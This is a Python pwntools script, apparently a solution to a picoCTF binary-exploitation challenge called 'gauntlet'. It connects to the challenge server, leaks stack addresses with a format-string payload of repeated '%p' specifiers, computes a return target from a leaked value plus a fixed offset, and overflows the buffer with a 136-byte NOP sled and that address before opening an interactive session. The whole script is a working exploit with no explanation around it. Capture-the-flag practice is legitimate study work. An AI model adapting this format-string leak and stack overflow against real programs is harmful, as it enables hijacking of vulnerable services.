#!/usr/bin/env python3
#9595dc79e46ae416c5383d858afbb624
#python3 solution.py

from pwn import *

format_string = " | ".join(["%p" for _ in range(0,30)])
payload_offset = 0xf63c6d596d

p = remote("mercury.picoctf.net", 37752)
#p = process("./gauntlet")
#raw_input("attach gdb")

p.sendline(format_string)

leaks = p.recvline()  # return bytes
leaks = leaks.decode().split(' | ')   # convert byte to string
print("leaked address: ",leaks[24]) # address where pc will jump when 'ret'

target_address = int(leaks[24], 16) + payload_offset    # stacks address where input gets copied
print("target address: ",hex(target_address))

nop = b"\x90" * 136
payload = nop + p64(target_address)
print(payload)
p.sendline(payload)

p.interactive()

